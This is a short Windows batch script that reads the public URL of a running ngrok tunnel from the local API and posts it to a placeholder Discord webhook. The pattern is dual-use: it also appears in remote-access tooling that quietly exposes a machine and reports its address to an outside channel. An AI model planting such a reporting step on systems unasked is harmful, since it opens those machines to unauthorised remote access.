timeout 5
set DISCORD_HOOK=YOUR_DISCORD_HOOK_URL
for /f "delims=" %%a in ('"curl -s localhost:4040/api/tunnels | jq -r .tunnels[0].public_url"') do @set VAR=%%a
echo %VAR%
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"%VAR%\"}" %DISCORD_HOOK%
